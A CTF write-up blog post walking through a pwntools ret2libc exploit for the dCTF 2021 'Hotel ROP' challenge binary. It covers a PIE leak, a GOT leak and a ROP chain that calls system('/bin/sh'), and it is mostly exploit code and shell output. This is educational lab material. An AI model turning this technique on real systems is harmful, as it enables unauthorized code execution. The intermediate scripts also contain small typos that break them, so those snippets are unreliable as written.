---
title: "dCTF 2021 - Hotel ROP"
date: 2021-05-24T20:22:21-05:00
draft: false
subtitle: "Returning 2 LIBC in a PIE enabled binary"
tags: ["pie", "aslr", "easy", "elf", "libc"]
author: "<a href='https://caprinux.github.io'>elma</a>"
---
Today, we will be looking at a pwn challenge from **dCTF 2021** which features ret2libc exploitation with a little twist of a `PIE-enabled` binary. The following PwnTools features will be introduced here:
- `pwnlib.rop` to help us craft ROP chains
- `pwnlib.elf` to make finding addresses quick and easy
- and many more little modules from `pwntools` to help us pwn faster ~

<br>

## Challenge Description
---
> They say programmers' dream is California. And because they need somewhere to stay, we've built a hotel!
>
> Attachments: [hotel_rop](/content/files/hotel_rop)

<br>

## Getting Started
---

For this challenge, we are provided with a binary and nothing else.

We quickly check the security features of the binary with `checksec hotel_rop` which returns

```
[*] '/media/sf_dabian/Challenges/dctf/pwn/hotel_rop'

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

As shown, `PIE` and `NX` is enabled. Let's run the binary and check out what we are dealing with

```
➜ ./hotel_rop
Welcome to Hotel ROP, on main street 0x55e4cd29636d
You come here often?
test
I think you should come here more often.
```

As you can see, we are given a leak and an input. Let's decompile and look at what's going on behind the scenes.

```c
int main()
{
  alarm(0xAu);
  printf("Welcome to Hotel ROP, on main street %p\n", main);
  vuln();
  return 0;
}

int vuln()
{
  int result;
  char s[28];
  int v2;

  puts("You come here often?");
  fgets(s, 256, stdin);
  if ( v2 )
    result = puts("I think you should come here more often.");
  else
    result = puts("Oh! You are already a regular visitor!");
  return result;
}

```

As you can see, we have a leak which points to `main()`, and we have a **buffer overflow** in `vuln()` as we are given **256 bytes of input** into a variable that holds **28 bytes of data**.

With this, it becomes rather apparent that we have to do a `ret2libc` in order to spawn a shell and win. However, since this binary is `PIE` enabled, we have to first calculate the `PIE` base.

<br>

## Exploitation
---

### Stage 1: Calculate PIE base

Since we know that our leak is the address of `main()`, we can easily calculate our offset with `elf.sym.main` and set it as the base_address by saving it to `elf.address`.

```py
from pwn import *

p = process('./hotel_rop') # run the process
context.binary = elf = ELF('hotel_rop') # set elf and context
libc = elf.libc # set libc

with log.progress('Calculating PIE base'): # cool loading bar !
  p.recvuntil('main street ')
  mainleak = int(p.recvline().rstrip(b'\n'), 16)

  elf.address = mainleak - elf.sym.main # use elf to save find main address and save PIE base into elf.address
  with log.success('PIE base @ elf.address')
```

OUTPUT:

```
[x] Starting local process './hotel_rop'
[+] Starting local process './hotel_rop': pid 3631
[x] Calculating PIE base
[*] Leak of main: 0x5562e309d36d
[+] PIE base @ elf.address
[+] Calculating PIE base: Done
```

Running the script, we see that we successfully found PIE base.

### Stage 2: Leak and calculate LIBC base

Since LIBC is ASLR-enabled, we also have to calculate the LIBC base. This means we will need a LIBC leak and we will do that in our `rop.chain()`.

We will leak an address from the `GOT` which contains libc addresses, and from there, calculate our libc base address.

Let's write our `rop.chain()`, but without having to find any gadgets or addresses ourselves!!

```py
from pwn import *

p = process('./hotel_rop') # run the process
context.binary = elf = ELF('hotel_rop') # set elf and context
libc = elf.libc # set libc

with log.progress('Stage 1: Calculating PIE base'): # cool loading bar !
  p.recvuntil(b'main street ')
  mainleak = int(p.recvline().rstrip(b'\n'), 16)

  elf.address = mainleak - elf.sym.main # use elf to save find main address and save PIE base into elf.address
  log.success(f'Stage 1 DONE: PIE base @ {hex(elf.address)}')

with log.progress('Stage 2: leaking LIBC address and calculating LIBC base'):
  rop1 = ROP(elf) # set up rop chain
  rop1.puts(elf.got.puts) # print global offset table entry for puts
  rop1.main() # loop back to main

  p.sendline(flat({ 40: rop1.chain()})) # easily find offset in GDB
  p.recvuntil(b'often.\n')

  pustgotleak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
  libc.address = putsgotleak - libc.sym.puts

  log.success(f'Stage 2 DONE: libc base @ {hex(libc.address)}')
```

OUTPUT:

```
[x] Starting local process './hotel_rop'
[+] Starting local process './hotel_rop': pid 4558

[x] Stage 1: Calculating PIE base
[+] PIE base @ 0x55c995a39000
[+] Stage 1: Calculating PIE base: Done

[x] Stage 2: leaking LIBC address and calculating LIBC base
[+] libc base @ 0x7f1ab1a60000
[+] Stage 2: leaking LIBC address and calculating LIBC base: Done
```

Success! Let's proceed with the last part of our exploit.

### Stage 3: Return 2 LIBC System!

Now we have all the pieces we need to return to libc. This is super simple with PwnTools as well, we simply need to look for our '/bin/sh' string with `libc.search()` and call `rop.system(binsh)`.

```py
from pwn import *

p = process('./hotel_rop') # run the process
context.binary = elf = ELF('hotel_rop') # set elf and context
libc = elf.libc # set libc

with log.progress('Stage 1: Calculating PIE base'): # cool loading bar !
  p.recvuntil(b'main street ')
  mainleak = int(p.recvline().rstrip(b'\n'), 16)

  elf.address = mainleak - elf.sym.main # use elf to save find main address and save PIE base into elf.address
  log.success(f'PIE base @ {hex(elf.address)}')

with log.progress('Stage 2: leaking LIBC address and calculating LIBC base'):
  rop1 = ROP(elf) # set up rop chain
  rop1.puts(elf.got.puts) # print global offset table entry for puts
  rop1.main() # loop back to main

  p.sendline(flat({ 40: rop1.chain()})) # flat automatically packs your rop chain after specific offsets, i.e. 40 in this case by padding with cyclic
  p.recvuntil(b'often.\n')

  putsgotleak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
  libc.address = putsgotleak - libc.sym.puts

  log.success(f'libc base @ {hex(libc.address)}')

with log.progress('Stage 3: Popping a shell!'):
  binsh = next(libc.search(b'/bin/sh')) # search for /bin/sh string in libc

  rop2 = ROP([libc, elf]) # making a new rop chain with our LIBC!
  rop2.system(binsh) # popping a shell...
  p.sendline(flat({40: rop2.chain()}))
  log.success(f'Enjoy your shell!')

p.clean() # remove all other binary output before popping shell, basically look better LOL
p.interactive()
```

OUTPUT:

```
[x] Starting local process './hotel_rop'
[+] Starting local process './hotel_rop': pid 4784

[x] Stage 1: Calculating PIE base
[+] PIE base @ 0x5558d4611000
[+] Stage 1: Calculating PIE base: Done

[x] Stage 2: leaking LIBC address and calculating LIBC base
[+] libc base @ 0x7f4dca447000
[+] Stage 2: leaking LIBC address and calculating LIBC base: Done

[x] Stage 3: Popping a shell!
[+] Enjoy your shell!
[+] Stage 3: Popping a shell!: Done

[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)

$ whoami
root
```

With that, we successfully popped a shell and pwned the binary!

---

#### Clean Script

```py
from pwn import *

p = process('./hotel_rop')
context.binary = elf = ELF('hotel_rop')
libc = elf.libc

#: RECEIVE LEAK CALCULATE PIE BASE
p.recvuntil(b'main street ')
mainleak = int(p.recvline().rstrip(b'\n'), 16)
elf.address = mainleak - elf.sym.main


#: LEAK PUTS GOT  
rop1 = ROP(elf)
rop1.puts(elf.got.puts)
rop1.main()
p.sendline(flat({ 40: rop1.chain()}))
p.recvuntil(b'often.\n')

#: CALCULATE LIBC BASE FIND BINSH
putsgotleak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
libc.address = putsgotleak - libc.sym.puts
binsh = next(libc.search(b'/bin/sh'))

#: POP SHELL
rop2 = ROP([libc, elf])
rop2.system(binsh)
p.sendline(flat({40: rop2.chain()}))
log.success(f'Enjoy your shell!')

p.clean()
p.interactive()
```
